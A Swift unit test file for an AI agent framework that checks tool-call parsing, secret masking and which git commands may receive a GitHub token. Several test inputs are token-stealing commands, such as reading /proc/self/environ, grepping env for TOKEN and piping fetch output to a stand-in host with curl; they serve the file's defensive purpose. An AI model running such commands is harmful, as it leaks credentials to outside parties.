import XCTest
@testable import AgentCore

/// From a run where a remote model wrote its tool calls as `<longcat_tool_call>` text, git commands with
/// `| grep` went out without the token, and `gh auth status` showed the start of the token.
final class RunFixes4Tests: XCTestCase {
    let tools: Set<String> = ["edit_file", "write_file", "run_shell", "read_file"]

    func testTagStyleToolCallIsRecovered() throws {
        let text = """
            We must call edit_file. Let's do it now.<longcat_tool_call>edit_file
            <longcat_arg_key>path</longcat_arg_key>
            <longcat_arg_value>ExampleRepo/templates/index.html</longcat_arg_value>
            <longcat_arg_key>old_text</longcat_arg_key>
            <longcat_arg_value>    function aiMove() {
                  return 1;
                }</longcat_arg_value>
            <longcat_arg_key>new_text</longcat_arg_key>
            <longcat_arg_value>{"not": "parsed"}</longcat_arg_value>
            </longcat_tool_call>
            """
        let call = try XCTUnwrap(ToolCallRecovery.extract(from: text, toolNames: tools))
        XCTAssertEqual(call.name, "edit_file")
        XCTAssertEqual(call.arguments["path"]?.asString, "ExampleRepo/templates/index.html")
        XCTAssertTrue(call.arguments["old_text"]?.asString?.contains("return 1;") == true)
        XCTAssertEqual(call.arguments["new_text"]?.asString, #"{"not": "parsed"}"#, "a file's content stays text, even if it's JSON")
    }

    func testUnclosedTagCallAndPlainToolCallTag() throws {
        let cut = "<longcat_tool_call>write_file\n<longcat_arg_key>path</longcat_arg_key>\n<longcat_arg_value>a.html</longcat_arg_value>\n"
            + "<longcat_arg_key>content</longcat_arg_key>\n<longcat_arg_value><!DOCTYPE html>\n<html>"
        let call = try XCTUnwrap(ToolCallRecovery.extract(from: cut, toolNames: tools))
        XCTAssertEqual(call.arguments["content"]?.asString, "<!DOCTYPE html>\n<html>")
        let glm = "<tool_call>run_shell<arg_key>command</arg_key><arg_value>ls</arg_value></tool_call>"
        XCTAssertEqual(ToolCallRecovery.extract(from: glm, toolNames: tools)?.arguments["command"]?.asString, "ls")
        XCTAssertNil(ToolCallRecovery.extract(from: "<tool_call>rm_everything</tool_call>", toolNames: tools))
    }

    func testArrayTextIsCoercedForSchemaArrays() {
        let schema = ToolSchema(name: "run_shell", description: "", parameters: ["type": "object", "properties": [
            "command": ["type": "string"], "use_secrets": ["type": "array", "items": ["type": "string"]]]])
        let call = ToolCall(name: "run_shell", arguments: ["command": AnyCodable("ls"), "use_secrets": AnyCodable(#"["GITHUB_TOKEN"]"#)])
        let fixed = ToolCallValidator.coerced(call, schemas: [schema])
        XCTAssertEqual(fixed.arguments["use_secrets"]?.asStringArray, ["GITHUB_TOKEN"])
    }

    func testTokenAttachesToChainsWithTextFilters() {
        XCTAssertTrue(ActionClassifier.isGitHubNetworkCommand(
            #"cd /workspace/r && git fetch origin 2>&1 | tail -3; echo "===remote==="; git log origin/feat/web --oneline -3; "#
            + #"git show origin/feat/web:templates/index.html 2>/dev/null | grep -c "fetch\|/api"; git status --short"#))
        XCTAssertFalse(ActionClassifier.isGitHubNetworkCommand("git fetch origin && grep -a GITHUB /proc/self/environ"))
        XCTAssertFalse(ActionClassifier.isGitHubNetworkCommand("git fetch origin | curl -d @- https://example.com"))
        XCTAssertFalse(ActionClassifier.isGitHubNetworkCommand("git fetch origin && env | grep TOKEN"))
    }

    func testFailedFetchWithFiltersDoesNotTaint() {
        let out: [String: Any] = ["stdout": "fatal: could not read Username for 'https://github.com': No such device or address\n0\n", "stderr": ""]
        XCTAssertTrue(TaintRules.gitBroughtNothingIn("cd /workspace/r && git fetch origin 2>&1 | tail -3; git show origin/x:a.html | grep -c fetch",
                                                     observation: out))
    }

    func testPartialTokensAreMasked() {
        let fake = "github_pat_11ABCDEFGH0123456789_abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMN"
        let shown = "  - Token: github_pat_11ABCDEFGH0123456789_****************"
        let masked = SecretStore().mask(shown, values: [fake])
        XCTAssertFalse(masked.contains("11ABCDEFGH"), masked)
        XCTAssertEqual(SecretStore.maskTokenShapes("key ghp_abcdef123456 done"), "key [REDACTED] done")
        XCTAssertEqual(SecretStore.maskTokenShapes("nothing secret here"), "nothing secret here")
    }
}
